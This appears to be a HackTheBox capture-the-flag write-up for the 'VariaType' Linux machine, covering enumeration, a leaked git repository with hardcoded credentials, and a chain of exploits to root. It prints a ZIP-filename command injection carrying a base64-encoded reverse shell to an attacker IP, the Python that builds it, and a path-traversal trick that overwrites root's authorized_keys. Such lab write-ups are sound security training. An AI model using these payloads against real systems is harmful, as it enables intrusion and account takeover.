---
title: "VariaType — HackTheBox"
date: 2026-03-21
categories: ["CTFs"]
tags: ["htb", "active", "linux", "rce", "git-exposure", "cve", "path-traversal", "privilege-escalation"]
summary: "Medium Linux machine — exposed .git repo leaks credentials, CVE-2025-66034 (FontTools RCE) for initial access, CVE-2024-25082 for lateral movement to steve, path traversal in install_validator.py for root."
featureimage: "img/ctf/variatype.png"
locked: true
lockPasswordHash: "8e724603cf84971c6f73d0853890b5b1e4264509239f0e22198a8b35e466ce1c"
---

{{< htb-machine name="VariaType" image="/img/VariaType.png" difficulty="Medium" os="Linux" retired="false" >}}

## Overview

| Field | Details |
|---|---|
| Platform | HackTheBox |
| Machine | VariaType |
| Difficulty | Medium |
| OS | Linux (Ubuntu 20.04) |

[Completion Certificate](https://labs.hackthebox.com/achievement/machine/2625118/850)

---

## Scanning and Enumeration

Nmap scan to identify open ports and running services.

```bash
$ nmap -sC -sV 10.129.15.13 -oN nmap.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-21 13:02 +0300

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://variatype.htb/

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Findings:**
- **22 → SSH**
- **80 → HTTP → `http://variatype.htb/`**

**Host Resolution:**

```bash
$ echo "10.129.15.13    variatype.htb" | sudo tee -a /etc/hosts
```

![Nmap scan results](/img/ctf/variatype/varia-00.png)

The web application is dedicated to font design and variable font generation, with a **Variable Font Generator** upload endpoint accepting `.designspace` and `.ttf`/`.otf` files.

![Font upload endpoint](/img/ctf/variatype/varia-01.png)

---

## Web Enumeration

### a. Main Page

Scanned `http://variatype.htb` using `gobuster`.

- **Finding:** Located a `/services` directory (Status: 200).

### b. Subdomain Fuzzing

Fuzzed `variatype.htb` for hidden virtual hosts using `ffuf`.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -u http://variatype.htb \
     -H "Host: FUZZ.variatype.htb" \
     -mc 200,302,403

portal   [Status: 200, Size: 2494, Words: 445, Lines: 59]
```

- **Finding:** `portal.variatype.htb` (Status: 200)

**Host Resolution:**

```bash
echo "10.129.15.13    portal.variatype.htb" | sudo tee -a /etc/hosts
```

![portal.variatype.htb login page](/img/ctf/variatype/varia-02.png)

Virtual host exposes an internal **"Typography Integrity & Document Validation Suite"** with a login form requesting an Employee ID or Username.

### c. Portal Directory Fuzzing

```bash
ffuf -u http://portal.variatype.htb/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -fc 404

.git/index   [Status: 200, Size: 137]
.git/HEAD    [Status: 200, Size: 23]
.git/config  [Status: 200, Size: 143]
.git         [Status: 301]
files        [Status: 301]
index.php    [Status: 200, Size: 2494]
```

The `.git` directory is publicly accessible — the repository was dumped using `git-dumper` to reconstruct the full source code locally.

### d. Git Commit History Analysis

```bash
git log

commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master)
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:33 2025 -0500
    fix: add gitbot user for automated validation pipeline
```

A recent commit introduced hardcoded credentials:

```bash
git show 753b5f5957f2020480a19bf29a0ebc80267a4a3d

diff --git a/auth.php b/auth.php
-$USERS = [];
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];
```

**Credentials discovered:** `gitbot:G1tB0t_Acc3ss_2025!`

---

## Initial Access

Authentication to `portal.variatype.htb` with the discovered credentials was successful, but access was limited — `gitbot` is a service account with no direct escalation path.

![Gitbot login success](/img/ctf/variatype/varia-03.png)

![Limited access dashboard](/img/ctf/variatype/varia-04.png)

Further enumeration of the application and the FontTools library version led to identifying a known CVE.

### CVE-2025-66034 — FontTools RCE

![CVE-2025-66034 details](/img/ctf/variatype/varia-05.png)

The application processes variable font files using a vulnerable version of **FontTools**. Improper handling of user-supplied input in `.designspace` files allows an attacker to inject malicious payloads into font metadata, resulting in **Remote Code Execution** when the file is processed.

**PoC:** [https://github.com/symphony2colour/varlib-cve-2025-66034](https://github.com/symphony2colour/varlib-cve-2025-66034)

The exploit generates a malicious font file with an embedded reverse shell payload and uploads it to the vulnerable endpoint.

![Exploit payload crafted](/img/ctf/variatype/varia-06.png)

**Shell obtained as:** `www-data`

---

## Lateral Movement

### Post-Exploitation Enumeration

Standard post-exploitation checks revealed another user account:

```bash
ls -la /home
drwx------  8 steve steve 4096 Feb 27 06:16 steve
```

Inspection of `/opt` revealed a backup processing script: `/opt/process_client_submissions.bak`

### Script Analysis

The script monitors the upload directory and processes font files, passing validated files to FontForge:

```bash
SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$'
# Passes validated files to:
fontforge.open('$file')
```

**Vulnerability:** The script validates outer filenames but **does not sanitize filenames inside uploaded ZIP archives**. FontForge extracts and processes internal filenames without validation — this is **CVE-2024-25082**, which allows command injection via crafted filenames in archives.

### CVE-2024-25082 — Command Injection via Crafted Archive

**Exploitation technique:** Craft a malicious ZIP with a filename containing an embedded command. Since `/` is not allowed in filenames, the reverse shell payload is base64-encoded:

```bash
# Malicious filename inside ZIP:
$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjAvNDQ0NCAwPiYx|base64 -d|bash).ttf
```

**Steps:**

1. Start a listener:
```bash
nc -lvnp 4444
```

2. Create the malicious ZIP:
```python
import zipfile
inner = '$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjAvNDQ0NCAwPiYx|base64 -d|bash).ttf'
with zipfile.ZipFile('exploit.zip', 'w') as z:
    z.writestr(inner, b'dummy')
```

3. Upload to target:
```bash
curl http://10.10.15.220:8888/exploit.zip \
     -o /var/www/portal.variatype.htb/public/files/exploit.zip
```

![Exploit uploaded, waiting for cron execution](/img/ctf/variatype/varia-07.png)

The cron job executes the processing script periodically, triggering the payload.

![Shell as steve obtained](/img/ctf/variatype/varia-08.png)

**Shell obtained as:** `steve`

```bash
cat /home/steve/user.txt
a87b299e7ca83c7a5476d981b68dbbf0
```

---

## Privilege Escalation

```bash
sudo -l
(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

![sudo -l output](/img/ctf/variatype/varia-09.png)

`steve` can run `install_validator.py` as root with arbitrary arguments, no password required.

### Script Analysis

```python
from setuptools.package_index import PackageIndex

PLUGIN_DIR = "/opt/font-tools/validators"

index = PackageIndex()
downloaded_path = index.download(plugin_url, PLUGIN_DIR)
```

The filename is derived from the URL:

```python
name = urllib.parse.unquote(path.split('/')[-1])
filename = os.path.join(tmpdir, name)
```

**Vulnerability — Path Traversal:** If the filename decodes to an absolute path, `os.path.join` ignores the intended directory:

```python
os.path.join('/opt/font-tools/validators', '/root/.ssh/authorized_keys')
# → /root/.ssh/authorized_keys
```

By URL-encoding `/` as `%2F`, the path splitting is bypassed and the decoded filename becomes an absolute path.

### Exploitation

1. Host your SSH public key on the attacker machine
2. Execute the vulnerable script via sudo:

```bash
sudo python3 /opt/font-tools/install_validator.py \
  'http://<attackerIP>:<port>/%2Froot%2F.ssh%2Fauthorized_keys'
```

The attacker's public key is written directly to `/root/.ssh/authorized_keys`.

3. SSH in as root:

```bash
ssh -i root_key root@target
```

![Root shell obtained](/img/ctf/variatype/varia-10.png)

**Rooted.**
